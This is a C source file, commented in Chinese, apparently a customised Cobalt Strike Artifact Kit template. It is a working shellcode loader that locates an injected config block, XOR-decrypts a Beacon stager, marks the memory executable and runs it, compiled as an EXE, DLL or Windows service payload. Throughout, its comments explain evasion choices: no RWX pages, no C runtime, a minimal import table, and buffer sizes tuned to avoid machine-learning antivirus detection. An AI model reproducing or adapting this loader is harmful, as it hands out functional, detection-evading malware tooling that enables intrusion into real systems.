/*
 * cs_dev :: artifact.c  (Artifact Kit 模板)
 * ---------------------------------------------------------------------------
 * Cobalt Strike 4.x 自定义 Artifact (stager 载体)
 *
 * CS 集成机制 (依据 common/BaseArtifactUtils.java:_patchArtifact 反向确认):
 *   1. CS 读模板 resources/artifact{32|64}[big|svc].exe，在文件内容中查找
 *      1024 个连续 0x41 ('A') 作为锚点:  var9 = content.indexOf("A" * 1024)
 *   2. 从锚点偏移 var9 起，以小端写入如下结构 (Packer.little):
 *        +0   int   var9 + 16                 (CS 自填, 本实现不使用)
 *        +4   int   payload.length            (stager 字节数)
 *        +8   byte  key[4]                    (4 字节随机 XOR 密钥)
 *        +12  int   loaderHint(GetModuleHandleA)   (可为 0)
 *        +16  int   loaderHint(GetProcAddress)     (可为 0)
 *        +20  byte  payload[i] ^ key[i % 4]   (XOR 加密后的 stager)
 *   3. replaceAt(content, packed, var9) 覆盖写回, 再 fixChecksum 修正 PE 校验和
 *   4. 试验版会额外追加 EICAR 字符串用于 AV 反应测试 (正式授权版不加)
 *
 * 因此模板只需保证:
 *   - 镜像内存在一段 1024 字节连续 'A' 的锚点
 *   - 锚点之后有足够连续缓冲区容纳 20 + payload 字节 (不同 payload 大小不同)
 *   - 运行时按上述偏移解析并执行 stager
 *
 * 相对原版模板的增强:
 *   - 执行前将 stager 缓冲区改权为 PAGE_EXECUTE_READ, 不出现 RWX
 *   - 解析完成后立即用零覆写锚点结构与密钥, 缩短内存中的 stager 存活窗口
 *   - 不使用 CRT (无 printf/memcpy 依赖), 减小体积与导入表特征
 *   - 通过模块句柄与函数指针调用 Win32 API, 导入表只保留必要项
 * ---------------------------------------------------------------------------
 */
#include <windows.h>
#if defined(CS_DEV_SVC)
#include <winsvc.h>
#endif

/* --- 1024 字节 'A' 锚点 (CS 在此处写入配置结构) ------------------------- */
#define A32  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
#define A256 A32 A32 A32 A32 A32 A32 A32 A32
#define A1024 A256 A256 A256 A256

/* CS 写入的配置结构 */
typedef struct {
    unsigned int  self;      /* +0  CS 自填 (本实现忽略) */
    unsigned int  size;      /* +4  stager 长度 */
    unsigned char key[4];    /* +8  XOR 密钥 */
    unsigned int  hint_gmh;  /* +12 可选 loader hint */
    unsigned int  hint_gpa;  /* +16 可选 loader hint */
    unsigned char data[];    /* +20 XOR 加密的 stager */
} ARTIFACT_CFG;

/*
 * 预留区大小决定能承载多大的 stager.
 * 关键约束来自实测: CS 原版模板的预留约 9.7KB (artifact64.exe 19456 字节,
 * 锚点 @9760), 取值过大会让 .data 出现大段连续零区, 体积相对原版成倍膨胀,
 * 这两点都是机器学习检测引擎的典型抓手 (实测触发 Win.Suspicious.ml)。
 *   小载体: stager 仅数 KB, 12KB 已足够且贴近原版量级
 *   big 载体: 承载 stageless 的完整 Beacon DLL (约 200-280KB), 原版预留约 280KB
 * CS 写入时不做容量校验, 预留不足会直接覆盖后续节区破坏文件, 故留足裕量。
 */
#ifdef CS_DEV_BIG
  #define AREA_SIZE (320 * 1024)
#else
  #define AREA_SIZE (12 * 1024)
#endif

/*
 * 锚点 + 工作区必须位于同一连续对象内: CS 从锚点起连续写入 20+size 字节,
 * 若两者分属不同节, 写入会越界破坏其它数据.
 */
__attribute__((used, section(".data")))
static struct {
    char          anchor[1025];          /* 1024 个 'A' + 结尾 NUL */
    unsigned char area[AREA_SIZE];       /* 配置与 stager 的落地区 */
} g_blob = { A1024, {0} };

/* 不引用 CRT 的最小辅助 */
static void zero(void *p, unsigned int n) {
    volatile unsigned char *v = (volatile unsigned char *)p;
    while (n--) *v++ = 0;
}

/* ---- 公共执行逻辑 (三种载体共用) ---- */
static void run_stager(void) {
    ARTIFACT_CFG  *cfg;
    unsigned char *buf;
    unsigned int   i, size;
    DWORD          old;
    void         (*entry)(void);

    /* 1. 定位 CS 写入的配置结构 */
    cfg = (ARTIFACT_CFG *)g_blob.anchor;

    /* 长度合法性检查: 越界或异常值直接退出, 避免在异常输入下执行 */
    if (cfg->size == 0 || cfg->size > sizeof(g_blob.area)) return;
    size = cfg->size;

    /* 2. 分配可写内存并解密 stager */
    buf = (unsigned char *)VirtualAlloc(0, size,
                                        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!buf) return;

    for (i = 0; i < size; i++)
        buf[i] = (unsigned char)(cfg->data[i] ^ cfg->key[i % 4]);

    /* 3. 缩短内存中的 stager 存活窗口: 立即擦除载体内的副本与密钥 */
    zero(cfg->data, size);
    zero(cfg->key, 4);
    cfg->size = 0;

    /* 4. 改权为可执行只读 (不出现 RWX) */
    VirtualProtect(buf, size, PAGE_EXECUTE_READ, &old);

    /* 5. 转入 stager 执行 */
    entry = (void (*)(void))buf;
    entry();

    /*
     * stager 正常不返回 (stage 下载完成后已接管控制流).
     * 若它返回, 说明 stage 仍在异步下载中, 此时退出进程会让 Beacon 随之消亡:
     * 保住当前进程, 让下载/反射加载有时间完成.
     */
    for (;;) Sleep(10000);
}

/* ============================================================================
 * 入口分派 —— 同一份源码编译三种 CS 载体格式
 *
 *   -DCS_DEV_DLL : DLL 载体        -> DllMain  (Console 子系统 + IMAGE_FILE_DLL)
 *   -DCS_DEV_SVC : 服务载体        -> 服务分发 + main (含 ADVAPI32 服务 API)
 *   默认         : EXE 载体        -> WinMain  (GUI 子系统)
 *
 * 与 CS 原版模板结构对照 (objdump 实测):
 *   artifact64.exe     : GUI,     VirtualAlloc/CreateThread
 *   artifact64svc.exe  : GUI,     StartServiceCtrlDispatcherA/RegisterServiceCtrlHandlerA
 *   artifact64.x64.dll : Console, IMAGE_FILE_DLL, VirtualAlloc/CreateThread
 * ==========================================================================*/

#if defined(CS_DEV_DLL)

/*
 * 本载体用 -nostartfiles 编译: 不链接 dllcrt2.o, 自提供 DLL 入口.
 *   收益 1: 只依赖 KERNEL32.dll, 不再拖入 msvcrt.dll (导入表特征更少)
 *   收益 2: 体积 4.0KB vs 默认入口 14.8KB (实测)
 *   收益 3: 不经过 _DllMainCRTStartup 的 CRT 初始化分支
 * DllMain 运行在加载器锁下, 此时调用 VirtualAlloc/VirtualProtect 会与加载器
 * 互锁; 原版模板的 VirtualAllocEx + ResumeThread 组合正是为绕开这一点.
 */
static DWORD WINAPI stager_thread(LPVOID param) {
    (void)param;
    run_stager();
    return 0;
}

BOOL WINAPI _DllMainCRTStartup(HANDLE hDll, DWORD reason, LPVOID reserved) {
    (void)hDll; (void)reserved;
    if (reason == DLL_PROCESS_ATTACH) {
        if (!CreateThread(0, 0, stager_thread, 0, 0, 0))
            run_stager();          /* 线程创建失败时退化为同步执行 */
    }
    return TRUE;
}

#elif defined(CS_DEV_SVC)

static SERVICE_STATUS        g_ss;
static SERVICE_STATUS_HANDLE g_ssh;

static void WINAPI svc_ctrl(DWORD code) {
    if (code == SERVICE_CONTROL_STOP || code == SERVICE_CONTROL_SHUTDOWN) {
        g_ss.dwCurrentState = SERVICE_STOPPED;
        if (g_ssh) SetServiceStatus(g_ssh, &g_ss);
    }
}

static void WINAPI svc_main(DWORD argc, LPSTR *argv) {
    (void)argc; (void)argv;

    g_ssh = RegisterServiceCtrlHandlerA("csdev", svc_ctrl);
    if (g_ssh) {
        zero(&g_ss, sizeof(g_ss));
        g_ss.dwServiceType      = SERVICE_WIN32_OWN_PROCESS;
        g_ss.dwCurrentState     = SERVICE_RUNNING;
        g_ss.dwControlsAccepted = SERVICE_ACCEPT_STOP;
        SetServiceStatus(g_ssh, &g_ss);
    }
    run_stager();          /* stager 接管后不再返回 */
}

int main(int argc, char **argv) {
    SERVICE_TABLE_ENTRYA tbl[2];
    (void)argc; (void)argv;

    tbl[0].lpServiceName = (LPSTR)"csdev";
    tbl[0].lpServiceProc = svc_main;
    tbl[1].lpServiceName = NULL;
    tbl[1].lpServiceProc = NULL;

    /* 被 SCM 作为服务启动 -> 走 svc_main; 直接双击运行则失败, 退回本进程执行 */
    if (!StartServiceCtrlDispatcherA(tbl)) {
        run_stager();
    }
    return 0;
}

#else

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
    (void)hInst; (void)hPrev; (void)lpCmd; (void)nShow;
    run_stager();
    return 0;
}

#endif

